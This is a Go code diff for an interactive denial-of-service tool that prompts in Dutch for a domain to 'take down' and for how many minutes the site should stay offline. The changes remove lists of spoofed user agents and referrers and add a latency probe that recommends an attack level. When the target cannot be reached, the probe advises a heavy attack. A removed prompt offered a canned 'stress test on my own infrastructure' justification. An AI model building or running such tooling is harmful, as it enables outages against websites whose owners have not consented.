@@ -6,35 +6,12 @@ import (
 	"math/rand"
 	"net/http"
 	"net/url"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
 )
 
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
-}
-
-func getRandomUserAgent() string {
-	return userAgents[rand.Intn(len(userAgents))]
-}
-
-var referrers = []string{
-	"https://www.google.com/",
-	"https://www.bing.com/",
-	"https://www.facebook.com/",
-	"https://twitter.com/",
-	"https://www.linkedin.com/",
-	"https://duckduckgo.com/",
-}
-
-func getRandomReferrer() string {
-	return referrers[rand.Intn(len(referrers))]
-}
 
 type domainStats struct {
 	domain          string
@@ -196,37 +173,62 @@ func worker(client *http.Client, targetURL string, s *domainStats, deadline time
 }
 
 func runSitePlof(o options) {
-	fmt.Println("\n🔥 NetScope SitePlof: Interactieve Attack Navigator")
+	fmt.Println("\n🔥 NetScope Attack Wizard: Voorbereiden van aanval")
 	fmt.Println("────────────────────────────────────────────────────────────")
 
-	if o.domain == "" {
-		o.domain = promptInput("Welk domein wil je platgooien?", "Voer het domein in (bijv. example.com)", "Ik wil een stresstest uitvoeren op mijn eigen infrastructuur. Hoe bepaal ik het doeldomein?")
-	}
-	o.domain = normalizeDomain(o.domain)
+	domain := normalizeDomain(o.domain)
 
 	// Step 1: Run measure to advise level
-	fmt.Println("\n[*] De site aan het doormeten voor advies...")
-	o.measure = true
-	o.probes = 3
-	runWebAnalysis(o)
+	fmt.Println("[*] Snelheidstest uitvoeren voor advies...")
+	client := &http.Client{Timeout: 5 * time.Second}
+	start := time.Now()
+	resp, err := client.Get("https://" + domain)
+	if err != nil {
+		resp, err = client.Get("http://" + domain)
+	}
+	
+	advLevel := 1
+	if err == nil {
+		duration := time.Since(start).Milliseconds()
+		resp.Body.Close()
+		fmt.Printf("[*] Gemeten latency: %dms\n", duration)
+		if duration < 50 {
+			advLevel = 3
+		} else if duration < 150 {
+			advLevel = 5
+		} else {
+			advLevel = 8
+		}
+	} else {
+		fmt.Println("[!] Kon site niet bereiken voor test, we raden een zware aanval aan.")
+		advLevel = 9
+	}
+
+	fmt.Printf("[*] Geadviseerd Attack Level: %d (1-10)\n", advLevel)
 
 	// Step 2: Level selection
-	levelStr := promptInput("Op welk Level wil je de aanval starten? (1-10)", "Kies een level gebaseerd op het advies hierboven.", "")
+	levelStr := promptInput("Op welk level wil je de aanval runnen?", "Kies 1-10", "")
 	fmt.Sscanf(levelStr, "%d", &o.level)
-	if o.level == 0 {
-		o.level = 1
+	if o.level < 1 { o.level = 1 }
+	if o.level > 10 { o.level = 10 }
+
+	// Step 3: Confirmation
+	confirm := promptInput(fmt.Sprintf("Weet je zeker dat je Level %d wilt runnen? (j/n)", o.level), "", "")
+	if strings.ToLower(confirm) != "j" {
+		fmt.Println("Aanval afgebroken.")
+		return
 	}
 
-	// Step 3: Duration
-	timeStr := promptInput("Hoeveel minuten moet de site offline?", "Voer de tijd in minuten in.", "")
+	// Step 4: Duration
+	timeStr := promptInput("Hoe lang moet de site offline liggen? (minuten)", "Bijv: 5", "")
 	fmt.Sscanf(timeStr, "%d", &o.attackMinutes)
-	if o.attackMinutes == 0 {
-		o.attackMinutes = 5
-	}
+	if o.attackMinutes <= 0 { o.attackMinutes = 1 }
 
-	fmt.Printf("\n🚀 Starten van aanval op %s (Level %d) voor %d minuten!\n", o.domain, o.level, o.attackMinutes)
+	fmt.Printf("\n🚀 ATTACK STARTED: %s | Level %d | Duur: %d min\n", domain, o.level, o.attackMinutes)
+	fmt.Println("Druk op Ctrl+C om de aanval voortijdig te stoppen.")
+	
 	applyLevelSettings(&o)
-	runAttack([]string{o.domain}, o)
+	runAttack([]string{domain}, o)
 }
 
 func startHealthMonitor(s *domainStats, deadline time.Time) {
